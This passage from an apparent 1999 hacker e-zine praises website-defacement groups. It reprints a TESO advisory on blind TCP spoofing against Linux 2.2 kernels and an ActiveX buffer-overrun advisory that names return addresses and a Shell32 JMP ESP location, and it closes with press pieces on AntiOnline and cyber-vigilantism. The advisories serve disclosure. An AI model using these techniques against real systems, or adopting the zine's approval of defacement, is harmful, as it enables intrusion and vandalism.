      The second incident was the raiding of members of the well known group gH &lt;http://www.attrition.org/mirror/attrition/gh.html> a.k.a global Hell. An approximate 19 people were raided if not more, not only from gH &lt;http://www.attrition.org/mirror/attrition/gh.html> but from other groups such as Level Seven &lt;http://www.attrition.org/mirror/attrition/l7.html>, team spl0it &lt;http://www.attrition.org/mirror/attrition/sploit.html>, milw0rm &lt;http://www.attrition.org/mirror/attrition/milworm.html> and IL(Iron Lungs) from HcV &lt;http://www.attrition.org/mirror/attrition/hcv.html>/Legion2000 &lt;http://www.attrition.org/mirror/attrition/l2k.html> and forpaxe &lt;http://www.attrition.org/mirror/attrition/forpax.html>. 
      Kevin Mitnick &lt;http://www.kevinmitnick.com> was screwed around 2+ times, with them changing his court date around continuously and him now having to owe 1 mil.
      Read more about it at 2600 &lt;http://www.2600.com>, also support the FREE KEVIN &lt;http://www.freekevin.com> movement.
      Just recently, a few incidents have happened as a result of John Veransevich otherwise known as JP from AntiOnline &lt;http://www.antionline.com>. First, Attrition &lt;http://www.attrition.org> makes a good accusation that JP indeed funded a hacker known as 'so1o' to deface the Senate &lt;http://www.senate.gov> Government website for him just to make a breaking news story (Although, I am not accusing him of doing this, because it was never proven). Another thing you notice about the "Anti Network" is the AntiCode &lt;http://www.anticode.com> website, which claims to be "the only place you need" for all of your exploits/network/security tools and utilities. But in reality this site is nothing more than an archive compiled from other known sites and the code ripped by AntiOnline &lt;http://www.antionline.com> it's self. Second MAJOR incident was when JP shut down a popular IRC server. And the third, probably most devastating to the underground community, was when JP caused Packetstorm Security to shut down, all of Ken Williams files were deleted forever, his work ruined. Not to mention many other things. You can read all those other things at : 
      &lt;http://www.attrition.org/negation/index2.html>
      A few conventions have passed, such as Defcon &lt;http://www.defcon.org>, Defcon &lt;http://www.defcon.org> is probably the most recognized of all hacker conventions, this year some major things happened at this convention, they had a line-up of great speakers, Carolyn P. Meinel showed up and was not allowed in because she was accused of not being a 'real' reporter (which I will not comment on), and shortly into the Defcon &lt;http://www.defcon.org> convention, their website was defaced by the very well know coding group known as ADM. Also Rootfest &lt;http://www.rootfest.org> and the Blackhat Briefings have recently passed by.
      
      Who has showed up?                                                                                  ~~~~~~~~~~~~~~~~~~
      Many new groups and individuals have showed up in 1999 up to now. To mention a few. and give a decent description of them and their actions + skills.
      
      Groups :                                                                  ~~~~~~~        						         
      * Forpaxe - Forpaxe showed up in early 99, they have been responsible for hitting a record number of .edu domains also quite a few .gov/.mil and numerous others. They are well known to all hackers and media. A member of the past groups Legion2000 and HcV was a part of this group in the beginning, Iron Lungs, which later got raided by the FBI. Now it appears to just be 2 individuals (m1crochip/in0de) which they state on all of their webpage defacements. They do what they do for a reason, so they are a decent group of individuals as far as I am concerned.
      
      Mirrors of their Website Defacements &lt;http://www.attrition.org/mirror/attrition/forpax.html>
      
      * Goat Security - This organization is a definite mentionable, everybody knows and remembers the goat team, it consisted of members of gH, HcV and I think even a few from LoU. They defaced a good amount of websites and made a widely known name for themselves. They definitely knew what they were doing, not like all of the CF(cold fusion) kiddies you see around these days.
      
      Mirrors of their Website Defacements &lt;http://www.attrition.org/mirror/attrition/goat.html>
      
      * gH (global Hell) - Possibly the most world wide known hacker group and most media exposed, gH defaced allot of high profile websites such as Macweek &lt;http://www.macweek.com>, Peoples Court &lt;http://www.peoplescourt.com>, The Main Army Page &lt;http://www.army.mil> and the Whitehouse &lt;http://www.whitehouse.gov>. Many members were later raided by FBI agents due to the defacing of the Whitehouse website. They have skill and as far I saw it a very good team of people. This group will always be remembered.
      
      Mirrors of their Website Defacements &lt;http://www.attrition.org/mirror/attrition/gh.html>
      
      * Level Seven - This crew was responsible for numerous defacements, it is rumored also and stated on some of their defacements that members of this group were a part of gH (global Hell) and got raided. This group was another group that hacked for a decent reason. Mentionable mostly because of their tie-ins with gH. None the less they are a good group.
      
      Mirrors of their Website Defacements 
      &lt;http://www.attrition.org/mirror/attrition/l7.html>
      
      * Stonehenge Crew - Not very much to say about this group other than they have a purpose for what they do. They always have a reason for defacing a website they hit. They have done around 14 webpage defacements. It is rumored they are also 'tight' with the known group gH. This is another good group.
      
      Mirrors of their Website Defacements &lt;http://www.attrition.org/mirror/attrition/henge.html>
      
      * Keebler Elves - Well, this group is probably the most skilled up to now in 1999. Many skilled individuals, coders and hacker alike in it, from what is said at least. They are best known for their hacks of the  &lt;http://www.ed.gov>Department of Education &lt;http://www.ed.gov>, Virgin Records &lt;http://www.virginrecords.com> and the Monmouth Army Base &lt;http://www.monmouth.army.mil>. Probably has done the most recognized sites in 1999. And I wouldn't be surprised if they continue to hack big time names. This group deserves allot of respect. Why? Because they aren't like the rest.
      
      Mirrors of their Website Defacements &lt;http://www.attrition.org/mirror/attrition/keebler.html>
      
      * HFD (Hacking for Drunks) - This is another group well known for it's choice of sites to deface. Probably most well recognized for their 20th Century Fox International &lt;http://www.foxintl.com>, Gibson &lt;http://www.gibson.com> and Blair Witch &lt;http://www.blairwitch.com> website hacks. They seem to have a good sense of humor and have done some entertaining defacements. Very good group. But name/logo kind of ripped from HFG(Hacking For Girls) &lt;http://www.attrition.org/mirror/attrition/hfg.html>.
      
      Mirrors of their Website Defacements &lt;http://www.attrition.org/mirror/attrition/hfd.html>
      
      * bl0w team - A good Brazilian hackers group, consisting of 5 individuals, best noted for their 2600.co.uk &lt;http://2600.co.uk> and Telemar &lt;http://www.telemar.com.br> hacks. They do it all for an adequate reason and do not give up. I think there patriotism is admirable. They also seem to have a good amount of skill dealing with Solaris/NT systems.
      
      Mirrors of their Website Defacements &lt;http://www.attrition.org/mirror/attrition/bl0w.html>
      
      * INDIANHackers/EHA/Ant1 S3cur1ty Tskf0rc3/MST(Moscow Security Team)
      Nothing special, not really even worth the time, they did a 'few' sites and were never heard from again. None of them had really any reason for defacing websites other than to make themselves look big. Ant1 S3cur1ty Taskf0rc3 did a few with reason, but it was rare with these 4 groups.

      MOST of the time it is to make a name and become known/noticed, but on some occasions people do it for a reason, to prove faulty security, to protest against a certain problem in the world or a personal dispute.

      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      TESO Security Advisory 
      26/09/1999 
      Linux Kernel 2.2.x ISN Vulnerability 
      Summary: A weakness within the TCP stack in Linux 2.2.x kernels has been discovered. The vulnerability makes it possible to "blind-spoof" TCP connections. It's therefore possible for an attacker to initiate a TCP connection from an arbitrary non existing or unresponding IP source address, exploiting IP address based access control mechanisms. Linux 2.0.x kernels were tested against this attack and found not to be vulnerable in any case. 
      
      
      1.1 Systems Affected                                                           ~~~~~~~~~~~~~~~~~~~~
      All systems running the kernel versions 2.2.x of the Linux operating 
      system. Linux 2.3.x systems may be affected, too, we didn't tested 
      this versions. 
      In our test situations we noticed that it doesn't seem to matter 
      whether the TCP syncookie functionality was enabled or not (enabled 
      within the kernel and activated through the proc filesystem options). 
      
      
      1.2 Tests 
      ~~~~~~~~~
      This is the beginning of a log of a successfully mounted blind TCP 
      spoofing attack agains a Linux 2.2.12 system.

      ... 
      The first ISN of the victim's host is 3929852318, which is within a SYNACK packet to the attackers host. This is unspoofed and can be easily snagged by the attacker. At the same time the attacker sent out the first unspoofed SYN packet he sent a spoofed SYN packet from 11.11.11.11 too. This packet is answered by the victims host too with the ISN of 3929859164. The difference between the first visible ISN and the second ISN is only (3929859164-3929852318) = 6846. Please notice that all TCP and IP parameters of the spoofed packet, except for the IP source address are the same as of the unspoofed packet. This is important (see below). 
      This small differences within the initial TCP sequence number (ISN) is 
      exploitable. In other tests, where both hosts were unlagged we even had 
      differences below 500 sometimes. We've managed to successfully blind spoof TCP connections on different Linux 2.2.x systems, that is reaching the TCP "ESTABLISHED" state without being able to sniff the victim host. 
      
      
      1.3 Impact 
      ~~~~~~~~~~ 
      By sending packets from a trusted source address, attackers could possibly bypass address based authentication and security mechanisms. 
      There have been similiar exploiting technics, aimed especially at r* and NFS services, in the past that demonstrated the security impact of weak ISNs very well. We have written a working exploit to demonstrate the weakness. 
      
      
      1.4 Explanation 
      ~~~~~~~~~~~~~~~
      The problem relies on a implementation flaw within the random ISN algorithm in the Linux kernel. The problem is within drivers/char/random.c, line 1684: __u32 secure_tcp_sequence_number(__u32 saddr, __u32 daddr, __u16 sport, __u16 dport) 
      { 
      ... 
      static __u32 secret[12]; 
      ... 
      secret[0]=saddr; 
      secret[1]=daddr; 
      secret[2]=(sport << 16) + dport; 
      seq = (halfMD4Transform(secret+8, secret) & 
      ((1<&lt;HASH_BITS)-1)) + count; 
      ... 
      } 
      As already said, in our spoofed TCP SYN packet only the IP source address differs, that is only secret[0], so of 12*4 random bytes used to create the sequence number from, only 4 bytes differ. Obviously the hash created by halfMD4Transform has similarities if the source and destination ports and the destination address are the same. It seems that the src-adress is least-significant to the above MD4 algorithm. Changing the source-ports too, makes the 2 ISNs more differ. Due to the short gap of time, the last seq += tv.tv_usec + tv.tv_sec*1000000; 
      is useless. This may be the reason why this bug may have survived long: 
      In any real network situation it is uncommon that the source and 
      destination ports are equal in two different connections on one host. 
      Further analyzation of the hash algorithm in this routine may result in a better ISN prediction than the one we use (range prediction). 
      
      
      1.5 Solution 
      ~~~~~~~~~~~~
      First: It's always unwise to rely on address based authentication, 
      because in a sniffable enviroment, such as the Internet, there 
      are always means of bypassing address based authentication. 
      Second: The press shouldn't hype this as _THE_ Linux bug.. everyone having looked at the ISNs/DNS Sequence numbers of any of Microsoft's 
      operating systems knows that their 'random numbers' are _much_ 
      easier targets to use for IP and DNS spoofing attacks. For a 
      a description how the ISN numbers of the Microsoft Windows NT 
      TCP stack have even weakened with the latest Service Packs, you 
      may want to browse the latest postings to the Bugtraq security 
      mailing list [1] or read [2]. Well.. not that it matters.. but who uses Microsoft software anyway ? 
      The Linux kernel developers have been notified at the same time as the 
      public Linux community, so a safe patch should be available real soon.

      - Mastering Network Security -&lt;http://www.amazon.com/exec/obidos/ASIN/0782123430/netsecurity> 
      
      Do you need to secure your network? Here's the book that will help you implement and maintain effective network security, no matter what size your network is or which NOS you're using. Packed with practical advice and indispensable information, this book systematically identifies the threats that your network faces and explains how to eliminate or minimize them. Covers all major network operating systems -- NT, NetWare, and Unix -- and all aspects of network security, from physical security of premises and equipment to anti-hacker countermeasures to setting up your own Virtual Private Networks. The CD includes evaluation and demonstration versions of commercial firewalls, intrusion detection software, and a complete security policy.		
      
      
      - Cisco IOS Network Security - &lt;http://www.amazon.com/exec/obidos/ASIN/1578700574/netsecurity> 
      
      Divided into five sections, the stage is set in the book's first chapter on security fundamentals. Cautioning against a slapdash approach, the authors offer pointers on developing and implementing a security policy for your organization. Heavily promoted is Cisco's Authentication, Authorization, and Accounting (AAA) security framework. Authentication lets you identify your users, authorization lets you decide what they can and can't have access to, and accounting lets you know what processes users are running and how much of the network's resources they are consuming. Cisco's team maintains that the AAA system forces you to keep a tight rein on your network, ultimately resulting in a more secure environment.		
      
      
      - Cryptography and Network Security : Principles and Practice - 
      &lt;http://www.amazon.com/exec/obidos/ASIN/0138690170/netsecurity>
       
      KEY BENEFIT: This book presents detailed coverage of network security technology, the standards that are being developed for security in an internetworking environment, and the practical issues involved in developing security applications. KEY TOPICS: Opening with a tutorial and survey on network security technology, Stallings provides a sound mathematical foundation for developing the algorithms and results that are the cornerstone of network security. Each basic building block of network security is covered, including conventional and public-key cryptography, authentication, and digital signatures, as are methods for countering hackers and other intruders and viruses. The balance of the book is devoted to an insightful and thorough discussion of all the latest important network security applications, including PGP, PEM, Kerberos, and SNMPv2 security. Now in its Second Edition, the book has been completely updated, reflecting the latest developments in the field.
      
      
      	
      - Internet Security : Professional Reference - &lt;http://www.amazon.com/exec/obidos/ASIN/156205760X/netsecurity> 
      
      Internet Security covers far more material than most other books on the subject, but--inevitably--in less depth. You'll find chapters on daemons, Unix-to-Unix copy (UUCP), audit trails, spoofing and sniffing, SATAN, Kerberos, encryption and PGP, Java, CGI, and viruses. Encompassing such a broad range of material in detail is risky, and this book suffers from several gaps. For example, the subject of electronic commerce goes untouched, with no mention of payment-specific schemes such as CyberCash or protocols such as Secure Electronic Transaction (SET). For those topics that are included, the level of depth varies considerably: Some topics are covered by well-written overviews, others by listing the programs' parameters in excruciating detail, and still others by simplistic tutorials that seem out of place in a technical volume. In addition, there are topics such as encryption, which are scattered across many sections.

16.0  The 'real' story behind JP and PSS as per Forbes magazine...
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      Via PSS
      
      http://www.forbes.com/columnists/penenberg/

      Go head and sue!

      IT'S A SAD FACT, but whenever someone is cited as an expert in
      one publication, he is almost sure to be quoted in another--and
      another and another. The reason is simple: The first thing a journalist
      does when beginning a story is to see what else has been written on
      the topic. Culling sources from other news articles is a good way
      to get started. 

      The problem is, few reporters check out these "experts," figuring that if
      a source made it into, say, The New York Times or The
      Washington Post, he must be reliable and, well, expert. Think of it
      as an extension of Howard Stern's media strategy. Stern once said he
      himself first coined the term "King of All Media," figuring that the 
      mainstream press would then start to
      call him that. (It did.) 

      How else to explain the schizophrenic emergence of
      twenty-year-old John Vranesevich, founder and
      operator of antionline.com, a web site that purports to
      follow the hacker scene. In the realm of mass media,
      "JP" has become a star, a youthful public figure who
      has been quoted extensively for his computer-security
      expertise and inside knowledge of the hacking world. 

      But in hacker circles he is a pariah. Perhaps only his
      close ally, Carolyn Meinel (a.k.a. "The Happy
      Hacker"), inspires more vitriol. At this year's Defcon,
      the hacker conference held in Las Vegas, Meinel had
      the dubious honor of being bodily ejected from the
      convention hall. 

      It's hard to gauge just how elite JP's hacker and
      computer-security skills are. But we do know his web
      site was taken down in August when someone with an
      account in Russia tricked AntiOnline into downloading
      software that redirected its visitors to another site. The
      hacker, obviously not a fan of JP's, included this
      message: "Expensive security systems do not protect
      from stupidity." 

      And online columnist Lew Koch, of CyberWire
      Dispatch, interviewed JP at length, exposing vast gaps
      of knowledge. For instance, Koch questioned JP about
      AntiOnline's alleged scoop of the hack of an atomic
      research center last year, yet he couldn't remember
      which country housed the center. JP kept insisting it
      was Israel, and, according to Koch, called the
      Bombay Atomic Research Center the "B'Hadvah
      Atomic Research Center." When Koch corrected him,
      JP admitted it must have been India. JP also claims
      he has "semi-contractual" relationships with NASA
      and the Defense Informations Systems Agency
      (DISA), yet Koch says both agencies deny this. 

      But the mass media appears ignorant of this. The New
      York Times turned to Vranesevich when it needed
      comment on a rash of anti-government hacks, while
      The Wall Street Journal Europe dubbed him an
      "online-security specialist." The Baltimore Sun asked
      for his opinion on the hack of the Johns Hopkins'
      medical school site. The Orange County Register
      invited him to bash hacker/martyr Kevin Mitnick, which
      he did with glee, saying that hackers don't have a clue
      about Mitnick's case, they "just heard it's cool to
      support Mitnick, and that is what they do." And the
      San Diego Union-Tribune dialed him up to ask about
      the threat of computer viruses. 

      Of course, JP has nothing against good press. It's the
      bad press that let's him unsheath his sharpest
      weapon. No, not the facts; those would only get in the
      way. We're talking about the threat of a lawsuit. 

      In June, JP contacted Harvard University to complain
      about a computer-security web site rival called
      PacketStorm, which had posted some nasty pictures,
      along with even nastier commentary. Harvard, afraid of
      a lawsuit, pulled the site, which was a favorite of
      computer-security professionals. JP claims on his web
      site that he didn't explicitly threaten lawsuit, but the
      University certainly took it that way. A Harvard
      spokesman told me this was the first time Harvard had
      ever pulled the plug on a site for "objectionable
      material." (Eventually, PacketStorm found a home with
      Kroll-O'Gara, the big-time detective agency in New
      York.) 

      Then in July, The Ottawa Citizen ran a story about JP,
      reporting allegations that JP is under investigation by
      the FBI for "employing hackers to target high-profile
      sites in order to scoop the rest of the media with
      exclusive reporting." Vranesevich contacted the
      newspaper and threatened to sue. Although Mark
      Anderson, The Citizen's high tech editor, said he was
      confident in the story, the FBI would not comment
      whether it was in fact investigating JP or not, even
      though several other sources in the know insisted he
      was. As a result, the Citizen removed the story from
      its web site, rather than face a potential lawsuit. 

      "It's sad," Anderson says. "You're confident you have
      reliable information, but the threat of a lawsuit forces
      you to pull your story. The onus was on us to prove
      that Vranesevich is under investigation by the FBI, but
      the FBI wouldn't say it outright. Since Canadian libel
      law is tougher than American libel law, we felt we had
      no choice." 

      In addition, folks trolling around cyberspace say that
      Vranesevich has threatened them with lawsuits
      whenever they post anything negative about him on
      their web sites. I wonder what he would do if someone
      actually took him up on this, since lawyers are
      expensive and, by all accounts, JP's business is far
      from being a cash cow. Perhaps, after reading this,
      he'll even sue me.

17.0  ActiveX Buffer Overruns Advisory
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Disclaimer: I'm not responsible for anything, unless it's 
      good.
      
      This advisory outlines several buffer overruns in several 
      controls, and the vulnerability of ActiveX controls to 
      buffer overrun attacks in general. It appears that the 
      ActiveX/OLE/COM technology in general does no buffer checks 
      before passing parameters to controls, leaving the checking 
      up to the control in question. Hence, many poorly written 
      controls are individually susceptible to buffer overrun 
      attacks, independent of the environment they are controlled 
      from, and other controls on the system. The following 
      controls are probably just a few of the vulnerable controls 
      which are in common use, including one control from a third 
      party vendor (Adobe). Because these controls are marked as 
      safe for scripting, they may be exploited through IE 
      through a web page, E-mail, or anywhere else where 'safe' 
      ActiveX controls may be scripted (ie some newsgroup readers 
      and other E-mail clients)
      
      Known Affected Controls:
      
      Acrobat Control for ActiveX   - PDF.OCX       v1.3.188
      Setupctl 1.0 Type Library     - SETUPCTL.DLL  v1, 1, 0, 6
      EYEDOG OLE Control module     - EYEDOG.OCX    v1.1.1.75
      MSN ActiveX Setup BBS Control - SETUPBBS.OCX  v4.71.0.10
      hhopen OLE Control Module     - HHOPEN.OCX    v1, 0, 0, 1
      RegWizCtrl 1.0 Type Library   - REGWIZC.DLL   v3, 0, 0, 0
      
      Each control contains at least one method, which does 
      incorrect handling of strings, and when manipulating a 
      string too large, a classic buffer overrun can occur, 
      allowing arbitrary code to be executed on the client.
      
      Protection:
      
      Microsoft has been notified of these exploits around a 
      month ago, and is releasing a patch to revoke the hhopen, 
      regwiz and setupctl controls, and a previous patch has been 
      released for Eyedog. For the other controls, and any others 
      found to be vulnerable, see Microsoft knowledge base 
      article Q240797 on how to stop an ActiveX control from 
      running in IE. If pain persists, disable ActiveX scripting 
      altogether in IE.

      Details:
      
      For each exploit, we have full control of the RET address, 
      knowing where to RET to in order to execute our code is 
      easier for some controls than others. For the controls 
      where no known fixed or referenced location of the code can 
      be found, I will simply RET to ExitProcess, although it is 
      still possible but more difficult to execute arbitrary 
      code. For the exploits which are easy to RET to the code, I 
      will demonstrate how to execute a program (CALC.EXE) using 
      fixed API locations in Win98, you will need to modify these 
      addresses depending on the versions in use. For the 
      exploits, similar to a couple other Win exploits, a JMP ESP 
      is required to get to the code. I didn't manage to find one 
      in Kernel32 or IExplore, however there does appear to be 
      one in Shell32 (version 4.72.3110.6) at (7FD035EB), you 
      will also need to modify this address depending on your 
      version. So if you get a crash at around this address, then 
      it is most likely possible to run the exploit, the address 
      just needs to be changed. It should be noted that arbitrary 
      code may be executed, not just running a program, this is 
      just an example. Also, I haven't tried posting HTML to this 
      forum before, so hopefully it will turn out ok, if not, 
      could the moderators please convert the HTML to plaintext 
      or something.

      EYEDOG:
      
      With this control, MSInfoLoadFile is the offending method. 
      There is no easy way to RET to our code, so instead, I have 
      shown how to simply RET to ExitProcess directly. This will 
      cause the host to terminate.

      PDF
      
      This control from Adobe Acrobat, can be exploited through 
      the setview method, and because ESP points to the address 
      after the RET address, we can place arbitrary code at this 
      point and JMP to it by RET'ing to a JMP ESP, in this case, 
      one found in Shell32. The code simply executes CALC.EXE 
      then calls ExitProcess to terminate the host without it 
      crashing. I have attempted to notify Adobe of the issue, 
      however they don't appear to have any form of direct 
      secure@ address.

      Apparently a control that was once used for the IE update 
      web site which is no longer in use, although it should 
      still exist on a lot of systems. With this exploit, similar 
      to the PDF exploit, ESP points to our code so we simply RET 
      to the same JMP ESP in Shell32. Also, this exploit differs 
      in that we set a property first (DistUnit) with the long 
      string, then call the method (InstallNow). Again, I have 
      simply demonstrated how to execute CALC.EXE, though any 
      code can be executed.

      The Registration Wizard control used by Microsoft to

      the 'InvokeRegWizard' method. When called with a long 
      string, pre-pended with '/i', we can gain control of the 
      RET address and exploit the control in a similar manner as 
      the PDF control. This exploit will cause a 'Regwiz.log' 
      file to be created in the temporary directory, and once 
      again will execute CALC.EXE and terminate the host.

      Sorry for the length of this advisory, but as there are 
      several exploits, and probably many more, it was necessary. 
      It should be noted, that not only MS ActiveX controls are 
      susceptible, but also many other vendors controls. I cannot 
      possibly go through all the controls which are available to 
      the public, but the controls which are installed by default 
      on most systems are obviously the most serious.

      Vigilante justice in cyberspace
      When companies want swift action against hackers, they donÆt
      always call the law
                                                      By Bob Sullivan
                                                             MSNBC

      Sept. 27 YouÆre a bank, and you think someone is trying to hack into your
      computer system. Where do you turn? Law enforcement offers little help 
      agencies are overworked and understaffed, and you risk public embarrassment
      if word gets out. Apparently, thereÆs another option. You might decide to take
      the law into your own hands.  Which means you might call a man known as Lou
      Cipher. Lou says heÆs spent the last 10 years working for Fortune 500 companies,
      turning the tables on computer intruders, performing what some have called vigilante
      justice in cyberspace.
      
      CIPHER, A PSEUDONYM of his own choosing, says
      
      he retired from a 15-year career as a computer consultant in 1990. By then, he had 
      already started his life as a hacker for hire. 
      
      In the past 10 years, heÆs says heÆs been hired over 50 times by big U.S. firms mostly
      financial institutions  looking to get hackers off their back. He says fees now start
      at $100,000 for new clients, with no promises of success.
      
      He and his associates often take on their tasks by bridging from the virtual world to
      the physical. That means breaking into the same computers a hacker has hijacked,
      
      chasing the trail through cyberspace, obtaining a real-world address and paying a 
      real-life visit. Cipher says heÆs even broken into homes and stolen hackersÆ computers 
      to teach them a lesson. He gives the  machines back after recovering any stolen 
      information I am engaged in the protection and regaining of stolen assets because of the
      inability of government to provide adequate protection and prosecution, Cipher says. And
      that includes, he admits, breaking laws himself. His defense: ItÆs self-defense. You can
      call the FBI right now and say a person just got off with a database of customers. What 
      is the FBI going to do?
                             
      The increase in technology crime has given fits to law enforcement agencies who find they
      donÆt have the necessary skills to keep up with an army of new criminals, emboldened by the
      anonymity the Net provides. Even when federal agents act, justice can be slow. It took almost
      six months for the recent nationwide FBI hacker crackdown to produce an arrest. 
   

      So Cipher, and some say other such corporate vigilantes, take the law into their own hands.
      Still, to call breaking into someone elseÆs home an act of corporate self-defense would likely
      be considered a stretch in court.

      I donÆt see that argument holding water, said cyberlaw expert Dorsey Morrow. It would be a 
      dangerous thing for a corporation to do. The potential liability is incredible.Particularly
      if vigilantes hit the wrong target. ThatÆs the concern of computer consultant Brian Martin,
      who maintains the popular hacker information site attrition.org.
      
      So Lou and his gang roll up on this house and know the intruder dialed from there. They bust
      in and terrorize an elderly couple. Oops! Martin said. How could they have been so wrong? Because
      the hacker used a laptop from the phone box outside their house. That scenario scares me.
      
      Cipher was first identified in public when information warfare expert Winn Schwartau used his 
      name in a column for Network World in January. Claims of baseball bat-wielding vigilantes stirred
      skepticism in the underworld, and neither Martin nor Space Rogue, who maintains the Hacker News 
      Network Web site, say theyÆve ever heard of a hacker being visited by any private security agent. 
      
      Is disarming an adversary illegal? ... YouÆre allowed to do repossession, which is stealing
      your own possessions back. - WINN SCHWARTAU
      
      Considering the size of this community, if he has visited more than 10 people I am sure word would
      have leaked, Rogue said. But he added There have been rumors floating around for a few years of 
      corporations with their own internal security taking matters into their own hands.
      
      That has law enforcement agencies anxious enough to discuss the matter publicly. Jim Christy, 
      special agent for the Department of Defense, debated Schwartau on the topic at the Infowarcon 
      conference earlier this month. I have no problem with identifying a bad guy and warning them,
      said Christy, who for 11 years was chief of computer crime for the Air Force Office of Special
      Investigations. ThatÆs a legitimate self-defense option for a victim. But it crosses the line
      when you violate the rights of others. ... It crosses the line when you break the law. 


      He said the key to making law enforcement agencies more effective is for more victims of computer
      crime to come forward. Without a backlog of cases, agents canÆt demand additional resources. 
      Companies that hire vigilantes, or who simply brush computer crime under the rug out of
      fear of embarrassment, only make the situation worse, he said.
      
      But that wonÆt help victims today, Schwartau said, and they need somewhere to turn.the legal 
      community says itÆs blatantly illegal, Schwartau said. Schwartau, who once shared ownership of a
      Web site venture with Cipher, says the legal community is being closed-minded on the topic. Is
      disarming an adversary illegal? ... YouÆre allowed to do repossession, which is stealing your own
      possessions back. 
    
      When MSNBC visited Cipher at his daytime consulting job, where he is a security adviser for a 
      large U.S. brokerage company, Cipher said he painstakingly verfies his targets and admits sometimes
      he doesnÆt catch them. Most of the examples he offered involved pre-emptive strikes against
      hackers probing financial networks the cyber equivalent of casing a bank before a robbery.
                                 
      Such pre-emptive strikes have taken him as far as Eastern Europe, and even India, he said. In one 
      case, he said college-aged hackers in hte Czech Republic were worming their way toward a bankÆs credit
      card database. Another incident involved hackers in India trying to fake an electronic funds transfer. 

      But sometimes, he said, he does his work entirely over the Internet. Last month he says his agents 
      broke into the computer of a man who held a vast database of stolen credit cards. They scrambled the
      card numbers to render them useless.
      
      Many more of his stories are less dramatic, involving a polite curbside or coffeehouse conversation 
      with a hacker. Often, thatÆs enough, he says.They are very surprised when we come to visit, when
      we bridge to the physical world, he said.

      Cyber-vigilantes hunt down
      hackers 

      January 12, 1999
      Web posted at: 12:19 a.m. EDT (1219 GMT) 

      by Winn Schwartau 
                                         From...
                                                    


      (IDG) -- In September 1998, the Electronic Disturbance Theater, a group of activists that
      practices politically driven cyber civil-disobedience, launched an attack aimed
      at disabling a Pentagon Web site by flooding it with requests. 

      The Pentagon responded by redirecting the requests to a Java applet programmed to
      issue a counteroffensive. The applet flooded the browsers used to launch the attack with 
      graphics and messages, causing
      them to crash. 

      The incident raises issues all user organizations will soon have to grapple with,
      if they haven't already. When you detect a break-in, should you launch a
      counterattack in order to protect your network? Is law enforcement capable
      of stopping cybercrime and can it be trusted to keep investigations quiet? If
      not, do corporations have a right to defend themselves? 

      Some emboldened user organizations are answering "yes." They are striking
      back against hackers, sometimes with military efficiency and intensity, in an
      effort to protect their self-interests. In the process, they are fueling a debate
      over what is legal and ethical in terms of corporate vigilantism. 

      One end of the opinion spectrum says law enforcement agencies
      are generally not up to the task, so corporations have a fiduciary
      responsibility to protect their interests. The only question for
      these companies is how far they are willing to go. Will they break
      laws, and if so, which ones? The opposite view is corporate vigilantism is wrong: 
      Taking the law into one's own hands only makes things worse. 

      The First Vigilante Corp.

      Lou Cipher (a pseudonym of his choice) is a senior security manager at one of
      the country's largest financial institutions. "There's not a chance in hell of us
      going to law enforcement with a hacker incident," he says. "They can't be
      trusted to do anything about it, so it's up to us to protect ourselves." 

      Cipher's firm has taken self-protection to the extreme. "We have the right to
      self-help - and yes, it's vigilantism," he says. "We are drawing a line in the
      sand, and if any of these dweebs cross it, we are going to protect ourselves." 

      Cipher says his group has management approval to do "whatever it takes" to
      protect his firm's corporate network and its assets. 

      "We have actually gotten on a plane and visited the physical location where
      the attacks began. We've broken in, stolen the computers and left a note: 'See
      how it feels?' " On one occasion, he says: "We had to resort to baseball bats.
      That's what these punks will understand. Then word gets around, and we're
      left alone. That's all we want, to be left alone." 

      A senior vice president of security at a major global financial firm speaks of
      the matter in military terms. He equates a hacker intrusion to a "first strike,"
      and says defense is an appropriate response. "If you use measures to restore
      your services, that's defense, not offense," he says. When asked how far his
      company goes, he concedes only, "I am willing to defend myself." 

      In interviews with dozens of companies, a surprising number are seriously
      considering implementing "strike-back" capabilities. However, when asked,
      most companies would not admit they have already taken such steps. 

      Bruce Lobree, an internal security consultant
      at a major financial institution, is cautious
      about admitting his firm uses vigilante
      activities and strike-back techniques. He
      says with a smile, "I can't answer yes or no.
      That's proprietary. Besides, legally we can't.
      But I can tell you that everything that occurs
      at our network perimeter and inside our
      networks is recorded." 

      A recent study, "Corporate America's
      Competitive Edge," conducted by Warroom
      Research, a competitive intelligence firm in
      Annapolis, Md., shows that 32% of the 320
      surveyed Fortune 500 companies have
      installed counteroffensive software.
      Warroom President Mark Gembecki notes
      that not every company will send out thugs to
      enforce their firewall policies.
      Cyber-response is OK, he says, but Cipher's
      physical retaliation is "a clear and overt
      violation of civil rights." 

      Such extreme counteroffensive methods
      raise the hackle of even the staunchest
      corporate information warrior. Lloyd Reese,
      program manager of information assurance
      for Troy Systems, a technical support
      company in Fairfax, Va., has a criminal
      justice background and says physical
      response is illegal and "doomed to failure."
      Such responses will only invite further
      attacks - perhaps even more intense, he
      says. 

      "Companies need to follow the appropriate legal process. We already have
      chaos on the Internet, why should we make it worse?" 

      Joseph Broghamer, information assurance lead for the U.S. Navy's Office of
      the Chief Information Officer, goes further, saying even the Pentagon
      shouldn't have done what it did. "Offensive information warfare is not a good
      thing . . . period. You want to block, not punish," he says. "There is no
      technical reason to react offensively to a hacker attack." His opinion is shared
      by precious few. 

      As part of its information security practice, Ernst & Young has been asked
      about strike-back capabilities and how hostile perimeters might be used for
      defense. 

      Dan Woolley, national leader of market development for the firm, says he
      knows of "companies in finance, insurance and manufacturing that are
      developing and deploying the capability to aggressively defend their networks."
      He is quick to point out, however, "We don't do it for ourselves even though
      we are attacked regularly." 

      The questions security software vendors and consultancies like Ernst &
      Young are now grappling with are wrenching: Should they develop offensive
      software, offer it to their clients, deploy it and support it? And if so, how open
      should they be about it? 

      How they do it 

      It's easy to understand why companies are interested in the idea of corporate
      vigilantism. Even the best layers of defense - firewalls, passwords and access
      control lists - can't work alone for many reasons. Among them: 

           Network topology, users and software are constantly changing. There
           is no way to keep up. 
           New vulnerabilities are found - and exploited - daily. 
           A small number of individuals with little technical skill can launch
           massive online attacks. 
           Once an attack is detected, corporate vigilantes have various methods
           of evening the score. 
           The Navy's Broghamer argues that sometimes the best response to an
           attack is to shut down the network connection altogether, although he
           acknowledges the Navy is not as sensitive to uptime and customer
           perception as the private sector. 
           Another approach is to send a strongly worded message to the source
           IP address or to an ISP in the path. Traceroute is a tool that can
